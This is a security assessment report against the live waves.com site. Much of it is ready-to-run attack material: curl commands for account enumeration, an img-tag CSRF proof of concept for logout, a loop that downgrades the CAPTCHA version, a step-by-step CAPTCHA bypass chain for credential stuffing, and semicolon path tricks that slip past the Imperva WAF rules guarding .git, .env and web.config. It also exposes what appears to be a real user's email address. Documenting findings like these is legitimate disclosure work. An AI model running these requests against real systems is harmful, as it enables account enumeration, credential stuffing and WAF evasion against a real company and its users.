# Waves.com Security Assessment — Full Findings Report

**Target:** https://www.waves.com (Waves Audio)
**Date:** 2026-09-22
**Stack:** ASP.NET Core, Kentico CMS, Imperva WAF (X-CDN: Imperva), Azure (ARRAffinity)
**Auth:** Cookie-based (`identity.authentication`), ASP.NET Core Data Protection tokens (CfDJ8 prefix)
**Caido Collection:** "Waves Auth Bypass Hunt" (9 replay sessions)

---

## Finding 1: User Enumeration via Login API Response Differential

**Severity:** Medium
**Caido Finding ID:** F1 | **Request ID:** 15258
**Endpoint:** `POST /api/membership/login`
**Caido Replay Session:** "User Enum - Login Differential"

### Description

The server checks user existence BEFORE validating the CAPTCHA token. This produces differential responses:

- **Existing user** + invalid captcha → `{"isValid":false,"relatedData":"recaptcha-error","errors":["Incorrect captcha code."]}`
- **Non-existing user** + invalid captcha → `{"isValid":false,"relatedData":null,"errors":["Incorrect username or password."]}`

No valid CAPTCHA is needed to enumerate accounts. No rate limiting detected.

### Reproduction

```bash
# Existing user (gets "recaptcha-error" → user exists)
curl -x http://localhost:8080 -k --compressed \
  -X POST 'https://www.waves.com/api/membership/login' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://www.waves.com' \
  -H 'Referer: https://www.waves.com/login' \
  -d '{
    "userName":"TARGET_EMAIL@example.com",
    "password":"WrongPasswordXYZ",
    "isPersistent":true,
    "captchaCode":"faketoken",
    "recaptchaVersion":3,
    "referrer":0,
    "wavesAppCode":"",
    "wavesAppTimeToken":0,
    "wavesUserGuid":"",
    "wavesAppLoginToken":""
  }'

# Non-existing user (gets "Incorrect username or password" → user does NOT exist)
curl -x http://localhost:8080 -k --compressed \
  -X POST 'https://www.waves.com/api/membership/login' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://www.waves.com' \
  -H 'Referer: https://www.waves.com/login' \
  -d '{
    "userName":"definitely_not_real_xyz@nonexistent.com",
    "password":"WrongPasswordXYZ",
    "isPersistent":true,
    "captchaCode":"faketoken",
    "recaptchaVersion":3,
    "referrer":0,
    "wavesAppCode":"",
    "wavesAppTimeToken":0,
    "wavesUserGuid":"",
    "wavesAppLoginToken":""
  }'
```

### Raw Request (Caido #15258)

```http
POST /api/membership/login HTTP/1.1
Host: www.waves.com
Content-Type: application/json
Origin: https://www.waves.com
Referer: https://www.waves.com/login
Cookie: [session cookies]

{"userName":"happykumar5634@gmail.com","password":"WrongPasswordXYZ","isPersistent":true,"captchaCode":"faketoken","recaptchaVersion":3,"referrer":0,"wavesAppCode":"","wavesAppTimeToken":0,"wavesUserGuid":"","wavesAppLoginToken":""}
```

### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-CDN: Imperva

{"isValid":false,"relatedData":"recaptcha-error","errors":["Incorrect captcha code."]}
```

---

## Finding 2: User Enumeration via Forgot Password Redirect

**Severity:** Low-Medium
**Caido Finding ID:** F2 | **Request ID:** 15190
**Endpoint:** `GET /forgot-password` (after form submission)
**Caido Replay Session:** "User Enum - Forgot Password Redirect"

### Description

The forgot-password page reveals user existence through differential behavior:

- **Existing user** → Shows success message: "A link to reset your password has been sent to your email"
- **Non-existing user** → Redirects to `/create-account`

### Reproduction

```bash
# Test via browser: go to https://www.waves.com/forgot-password
# Enter an email and observe:
# - Known email → success message stays on page
# - Unknown email → redirects to /create-account
```

### Raw Request (Caido #15190)

```http
GET /forgot-password HTTP/1.1
Host: www.waves.com
User-Agent: Mozilla/5.0
```

### Notes

This requires a valid CAPTCHA to submit the form, so it's harder to automate than Finding 1. But the differential behavior is visible in the browser.

---

## Finding 3: reCAPTCHA Automation/Test Site Key Exposed in Production DOM

**Severity:** Medium
**Caido Finding ID:** F3 | **Request ID:** 15089
**Endpoint:** Login page DOM
**Caido Replay Session:** "reCAPTCHA Automation Key Leak"

### Description

The production login page DOM contains three reCAPTCHA site keys, including a well-known **automation/testing key** in a hidden div:

```html
<div id="recaptcha2-automation" class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
```

This is Google's official test key that always passes validation. The client-side guard (`kentico-environment === "dev"/"test"` + `WavesSelenium` User-Agent check) doesn't execute in production, but the key is exposed to anyone reading the DOM.

The `recaptchaVersion` parameter sent to the server is fully attacker-controlled (see Finding 7).

### Key Details

| Key | Purpose | Location |
|-----|---------|----------|
| `6LdL3RkqAAAAAMk...` | reCAPTCHA v3 (invisible, production) | `#recaptcha3` |
| `6LfH2RkqAAAAAIm...` | reCAPTCHA v2 (checkbox, fallback) | `#recaptcha2` |
| `6LeIxAcTAAAAAJcZ...` | **Automation/Test key** (always passes) | `#recaptcha2-automation` |

### Raw Response Body (relevant section from login page)

The login response (Caido #15089, status 200) contains the full login page with the automation key visible in the DOM. The response also leaks:

```json
{
  "isExistingUser": true,
  "numberOfCreditCards": 0,
  "availableCredit": 0,
  "creditCardService": 0,
  "gA_GUID": ""
}
```

---

## Finding 4: CSRF on Logout — GET-Based Logout Endpoint

**Severity:** Low
**Caido Finding ID:** F4 | **Request ID:** 15305
**Endpoint:** `GET /api/membership/logout`
**Caido Replay Session:** "CSRF Logout - GET-based"

### Description

The logout endpoint processes session termination via GET request with no CSRF token. Despite returning HTTP 404, the server issues a NEW `identity.authentication` cookie, effectively resetting the session. This is exploitable via `<img>` tags or any GET-based CSRF vector.

### Reproduction

```bash
curl -x http://localhost:8080 -k --compressed \
  'https://www.waves.com/api/membership/logout' \
  -H 'Cookie: identity.authentication=VICTIM_SESSION_COOKIE'
```

### CSRF PoC (HTML)

```html
<!-- Place on attacker-controlled page; victim visits while logged in -->
<img src="https://www.waves.com/api/membership/logout" style="display:none" />
```

### Raw Request (Caido #15305)

```http
GET /api/membership/logout HTTP/1.1
Host: www.waves.com
Cookie: identity.authentication=[authenticated session cookie]
```

### Raw Response

```http
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=utf-8
Set-Cookie: identity.authentication=CfDJ8ITa-CLDIhBNqb7blBRhcQDTnwFtbcVMLJx7KJs83Wc...; expires=Tue, 06 Oct 2026 10:50:09 GMT; path=/; secure; samesite=lax; httponly

[HTML 404 page body]
```

**Key observation:** Returns 404 but still sets a new `identity.authentication` cookie — the session is terminated despite the error status code. The `SameSite=Lax` attribute partially mitigates this (blocks cross-site POST but allows GET navigation).

---

## Finding 5: Information Disclosure via API Endpoints

**Severity:** Low-Medium
**Caido Finding ID:** F5 | **Request ID:** 12373
**Endpoint:** Multiple API endpoints
**Caido Replay Session:** "Info Disclosure - is-authenticated"

### Description

Multiple API endpoints leak sensitive information:

| Endpoint | Leaked Data |
|----------|-------------|
| `POST /api/membership/is-authenticated` | email, GA GUID, MaxMind geolocation, creditCardService |
| `POST /api/membership/login` (success response) | isExistingUser, numberOfCreditCards, availableCredit, gA_GUID |
| `POST /api/membership/create-account` | gA_GUID (cross-tracking identifier) |
| `gdpr2` cookie | User consent data on wildcard `.waves.com` domain |

### Reproduction

```bash
# Check auth status (leaks user info when authenticated)
curl -x http://localhost:8080 -k --compressed \
  -X POST 'https://www.waves.com/api/membership/is-authenticated' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://www.waves.com' \
  -H 'Cookie: identity.authentication=AUTHENTICATED_COOKIE' \
  -d '{"referrer":1}'
```

### Raw Request (Caido #12373)

```http
POST /api/membership/is-authenticated HTTP/1.1
Host: www.waves.com
Content-Type: application/json
Origin: https://www.waves.com
Referer: https://www.waves.com/

{"referrer":1}
```

### Raw Response (unauthenticated)

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: https://www.waves.com
X-Powered-By: ASP.NET
Request-Context: appId=cid-v1:c0d9f4db-5f08-4bf6-8a4c-77e92e58da2e

{"isValid":true,"relatedData":{"isUserAuthenticated":false,"cartData":null,"userName":"public"},"errors":[]}
```

**Note:** The `Request-Context` header leaks the Azure Application Insights client ID across all responses.

---

## Finding 6: Weak SimpleCaptcha Fallback — Trivially OCR-Solvable

**Severity:** Medium (High when combined with Finding 7)
**Caido Finding ID:** F6 | **Request ID:** 15584
**Endpoint:** `GET /api/simplecaptcha/render?index=N&t=TIMESTAMP`
**Caido Replay Session:** "SimpleCaptcha Render - Weak Image"

### Description

The SimpleCaptcha fallback mechanism produces images with:
- Clean, high-contrast characters on solid pastel backgrounds
- Standard fonts with NO distortion or warping
- Only faint diagonal colored lines as "noise"
- Well-spaced characters, easily segmentable

These are trivially solvable by basic OCR engines (Tesseract, etc.). The application uses a fallback chain: reCAPTCHA v3 → reCAPTCHA v2 → SimpleCaptcha. If reCAPTCHA fails (e.g., blocking Google's scripts), SimpleCaptcha is used.

### Captcha Samples Observed

| Sample | Text | Background | Noise |
|--------|------|------------|-------|
| 1 | D 9 H X U | Light green | 3 diagonal lines |
| 2 | R D Y A 7 | Pink | 2 diagonal lines |
| 3 | 8 A C Y U | Purple/pink | 1 diagonal line |
| 4 | D P G N J | Lavender | 3 diagonal lines |
| 5 | H W 3 6 W | Pink | 2 diagonal lines |
| 6 | 6 R N 7 V | Beige | 3 diagonal lines |
| 7 | J X L G P | Gray/brown bg | 1 faint line |
| 8 | V 3 D K M | Light green | 2 diagonal lines |
| 9 | B F V T R | Pink | 3 diagonal lines |
| 10 | E 3 H A U | Light yellow | 2 diagonal lines |

### Reproduction

```bash
# Fetch a captcha image (no auth required)
curl -x http://localhost:8080 -k --compressed \
  'https://www.waves.com/api/simplecaptcha/render?index=0&t=1790075864000' \
  -o captcha_sample.png

# The image will show 5 clean characters on a solid background
# Any basic OCR tool can read them
```

### Raw Request (Caido #15584)

```http
GET /api/simplecaptcha/render?index=0&t=1790075864000 HTTP/1.1
Host: www.waves.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

### Raw Response

```http
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 2541
Cache-Control: no-cache,no-store
Set-Cookie: .AspNetCore.Session=CfDJ8ITa%2BCLDIhBNqb7blBRhcQDPjwQh...; path=/; samesite=lax; httponly

[PNG image data - 5 clear characters on pastel background]
```

### Notes

- The captcha answer is tied to the `.AspNetCore.Session` cookie
- The `index` parameter (0-4) seems to control which character slot
- The `t` parameter is a timestamp (cache-bust)
- Session cookie MUST be sent with the login request that includes the SimpleCaptcha answer

---

## Finding 7: recaptchaVersion Parameter Allows CAPTCHA Downgrade Attack

**Severity:** Medium (High when combined with Finding 6)
**Caido Finding ID:** F7 | **Request ID:** 15583
**Endpoint:** `POST /api/membership/login` (also affects `/forgot-password`, `/create-account`)
**Caido Replay Session:** "recaptchaVersion Downgrade - v0"

### Description

The `recaptchaVersion` parameter is attacker-controlled (`System.Int32`). The server accepts arbitrary integer values (0, 1, 2, 3, 4, 5, 99, -1) without rejecting invalid versions. The client-side JavaScript implements:

- Version 3 → reCAPTCHA v3 (invisible, score-based)
- Version 2 → reCAPTCHA v2 (checkbox)
- Fallback → SimpleCaptcha (weak image captcha — see Finding 6)

By manipulating `recaptchaVersion`, an attacker may force the server to validate against the weaker SimpleCaptcha path.

### Behavioral Difference by Version

| recaptchaVersion | Existing User + Bad Captcha | Non-existing User + Bad Captcha |
|------------------|-------|------|
| 3 (reCAPTCHA v3) | `"relatedData":"recaptcha-error"` | `"relatedData":null` + "Incorrect username or password" |
| 0 (SimpleCaptcha?) | `CaptchaCode: "wrong or missing"` | `CaptchaCode: "wrong or missing"` |

**Key insight:** Version 3 leaks user existence (Finding 1), while version 0 does NOT — indicating different code paths on the server.

### Reproduction

```bash
# Test with recaptchaVersion=0 (SimpleCaptcha path)
curl -x http://localhost:8080 -k --compressed \
  -X POST 'https://www.waves.com/api/membership/login' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://www.waves.com' \
  -d '{
    "UserName":"test@test.com",
    "Password":"Test123!",
    "recaptchaVersion":0,
    "recaptchaToken":"",
    "simpleCaptchaCode":"ABCDE"
  }'

# Test with various version values (all accepted by the server)
for ver in 0 1 2 3 4 5 99 -1; do
  echo "=== Version $ver ==="
  curl -x http://localhost:8080 -k --compressed \
    -X POST 'https://www.waves.com/api/membership/login' \
    -H 'Content-Type: application/json' \
    -d "{\"UserName\":\"test@test.com\",\"Password\":\"Test123!\",\"recaptchaVersion\":$ver,\"recaptchaToken\":\"test\"}"
done
```

### Raw Request (Caido #15583)

```http
POST /api/membership/login HTTP/1.1
Host: www.waves.com
Content-Type: application/json
Origin: https://www.waves.com
Cookie: incap_ses_739_2775454=...; .AspNetCore.Session=CfDJ8ITa%2BCLDIhBNqb7blBRhcQCA...

{"UserName":"definitely_not_real_xyz@nonexistent.com","Password":"Test123!","recaptchaVersion":0,"recaptchaToken":"","simpleCaptchaCode":"BFVTR"}
```

### Raw Response

```http
HTTP/1.1 400 Bad Request
Content-Type: application/problem+json; charset=utf-8
Access-Control-Allow-Origin: https://www.waves.com

{"type":"https://tools.ietf.org/html/rfc7231#section-6.5.1","title":"One or more validation errors occurred.","status":400,"traceId":"00-ed99ce06afddde5c8eb095fc90eb9ab7-df4bd7a3a5194148-00","errors":{"CaptchaCode":["The captcha code is wrong or missing."]}}
```

### Attack Chain: Finding 6 + Finding 7 = CAPTCHA Bypass

1. Set `recaptchaVersion=0` in login request
2. Fetch SimpleCaptcha image from `/api/simplecaptcha/render?index=0&t=TIMESTAMP`
3. OCR the trivial captcha image (clean text, standard fonts)
4. Submit login with the OCR'd captcha code and the `.AspNetCore.Session` cookie from step 2
5. Repeat for credential stuffing — no reCAPTCHA validation involved

---

## Finding 8: Imperva WAF Path Rules Bypassed via Semicolon (;) Path Parameter

**Severity:** Medium
**Caido Finding ID:** F8 | **Request ID:** 15687
**Endpoint:** Multiple WAF-protected paths
**Caido Replay Session:** "WAF Bypass - Semicolon .git;/HEAD"

### Description

Multiple Imperva WAF path-blocking rules can be bypassed by inserting a semicolon (`;`) into the URL path. Semicolons are treated as path parameters by IIS/ASP.NET, but the Imperva WAF's pattern matching doesn't account for them.

### Bypass Results

| Normal Path | WAF Status | Bypass Path | Bypass Status |
|-------------|-----------|-------------|---------------|
| `/.git/HEAD` | 403 (blocked) | `/.git;/HEAD` | **404 (passed through)** |
| `/.git/config` | 403 (blocked) | `/.git;/config` | **404 (passed through)** |
| `/.env` | 403 (blocked) | `/.env;.js` | **404 (passed through)** |
| `/web.config` | 403 (blocked) | `/web.config;.js` | **404 (passed through)** |
| `/CMSPages/logon.aspx` | 403 (blocked) | `/CMSPages;/logon.aspx` | **404 (passed through)** |
| `/CMSPages/Staging/SyncServer.asmx` | 403 (blocked) | `/CMSPages;/Staging/SyncServer.asmx` | **404 (passed through)** |
| `/Admin/logon.aspx` | 403 (blocked) | `/Admin;/logon.aspx` | **403 (still blocked)** |
| `/CMSAdminControls` | 403 (blocked) | `/CMSAdminControls;/` | **403 (still blocked)** |

The bypass works for `.git/`, `.env`, `web.config`, and `CMSPages/` rules but NOT for `Admin/` and `CMSAdminControls/`.

Currently the backend returns 404 (the semicolon alters IIS path routing), but this demonstrates a gap in WAF coverage.

### Reproduction

```bash
# Normal request — WAF blocks with 403
curl -x http://localhost:8080 -k --path-as-is --compressed \
  'https://www.waves.com/.git/HEAD'
# Response: 403

# Bypass with semicolon — WAF lets through, backend returns 404
curl -x http://localhost:8080 -k --path-as-is --compressed \
  'https://www.waves.com/.git;/HEAD'
# Response: 404 (passed through WAF!)

# More bypass variants
curl -x http://localhost:8080 -k --path-as-is --compressed \
  'https://www.waves.com/.env;.js'
curl -x http://localhost:8080 -k --path-as-is --compressed \
  'https://www.waves.com/web.config;.js'
curl -x http://localhost:8080 -k --path-as-is --compressed \
  'https://www.waves.com/CMSPages;/logon.aspx'
curl -x http://localhost:8080 -k --path-as-is --compressed \
  'https://www.waves.com/CMSPages;/Staging/SyncServer.asmx?WSDL'
```

### Raw Request (Caido #15687)

```http
GET /.git;/HEAD HTTP/1.1
Host: www.waves.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

### Raw Response

```http
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=utf-8
Set-Cookie: identity.authentication=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; secure; samesite=lax; httponly
X-Powered-By: ASP.NET
X-CDN: Imperva
Content-Length: 9501

<!DOCTYPE html>
<html lang="en">
<head><title>Page Not Found – Waves Audio</title>
...
```

**IMPORTANT:** Use `--path-as-is` with curl to prevent client-side path normalization.

---

## API Endpoint Map

All discovered API endpoints and their behavior:

| Method | Endpoint | Auth Required | CAPTCHA | Notes |
|--------|----------|--------------|---------|-------|
| POST | `/api/membership/login` | No | Yes | User enum (F1), version downgrade (F7) |
| POST | `/api/membership/create-account` | No | Yes | Leaks gA_GUID |
| POST | `/api/membership/forgot-password` | No | Yes | User enum via redirect (F2) |
| POST | `/api/membership/is-authenticated` | No | No | Info disclosure (F5) |
| POST | `/api/membership/external-login` | No | No | Google/Facebook JWT auth |
| POST | `/api/membership/waves-app-data` | No | No | Desktop app auth (AppCode + timeToken:Int64) |
| POST | `/api/membership/resend-activation-email` | No | Yes | Email bombing potential (captcha gated) |
| POST | `/api/membership/change-password` | Yes | No | No CAPTCHA — brute-force current password |
| POST | `/api/membership/pluginsbi-consent` | Yes | No | Plugin consent |
| GET | `/api/membership/logout` | Yes* | No | CSRF via GET (F4), returns 404 but processes |
| GET | `/api/simplecaptcha/render` | No | N/A | Weak captcha images (F6) |
| GET | `/api/userpurchaseddata/get-data` | Yes | No | User purchase data |
| GET | `/api/notifications/data` | No* | No | Returns empty if unauthed |
| POST | `/api/notifications/set` | Yes | No | Set notification status |
| GET | `/api/shoppingcart/get-data` | Yes | No | Shopping cart |
| GET | `/api/sitesearch/site-header-search` | No | No | Site search (WAF blocks XSS) |
| POST | `/api/misc/wishlist/add-item-to-wishlist` | Yes | No | Requires auth |
| GET | `/api/Account/RecentlyViewedProducts/` | Yes | No | Recently viewed |
| GET | `/confirm-account` | No | No | Account confirmation (userguid + hash) |

## Tech Stack Details

| Component | Detail |
|-----------|--------|
| **Backend** | ASP.NET Core (`X-Powered-By: ASP.NET`) |
| **CMS** | Kentico (CMSPages, GetAzureFile.aspx, CMSShoppingCart cookie) |
| **WAF** | Imperva (`X-CDN: Imperva`, `incap_ses_*` / `visid_incap_*` cookies) |
| **Hosting** | Azure (ARRAffinity cookies, Application Insights) |
| **CDN** | Imperva (same as WAF) |
| **Analytics** | Google Analytics, Google Tag Manager (GTM-NMNKFR), Azure App Insights |
| **Session** | ASP.NET Core Data Protection tokens (CfDJ8 prefix, AES-256-CBC + HMACSHA256) |
| **Session Cookie** | `identity.authentication` (HttpOnly, Secure, SameSite=Lax, 14-day expiry) |
| **App Insights ID** | `cid-v1:c0d9f4db-5f08-4bf6-8a4c-77e92e58da2e` |

## Untested / Inconclusive Attack Surface

| Area | Status | Why |
|------|--------|-----|
| Host header injection on forgot-password | Blocked | Needs valid CAPTCHA to reach email-sending logic |
| `/api/membership/change-password` brute-force | Inconclusive | Session expired during testing; endpoint confirmed to have NO CAPTCHA |
| Desktop app auth (`waves-app-data`) | Needs real credentials | Accepts AppCode (string) + timeToken (Int64), returns generic errors |
| Notification IDOR | Needs valid GUIDs | Endpoint works unauthenticated but returns empty results |
| SimpleCaptcha end-to-end bypass | Session management issue | Captcha renders correctly but session cookie + Imperva cookies make automation complex |
| Origin IP behind WAF | Not attempted | Could expose Kentico SyncServer (CVE-2025-2746/2747) |
| OAuth claim verification depth | Unknown | Server validates JWT signature but unclear if it cross-references email claims |

---

## Caido Replay Sessions

All sessions are in the **"Waves Auth Bypass Hunt"** collection:

1. **User Enum - Login Differential** — Finding 1
2. **User Enum - Forgot Password Redirect** — Finding 2
3. **reCAPTCHA Automation Key Leak** — Finding 3
4. **CSRF Logout - GET-based** — Finding 4
5. **Info Disclosure - is-authenticated** — Finding 5
6. **SimpleCaptcha Render - Weak Image** — Finding 6
7. **recaptchaVersion Downgrade - v0** — Finding 7
8. **WAF Bypass - Semicolon .git;/HEAD** — Finding 8
9. *(Additional sessions from earlier testing)*
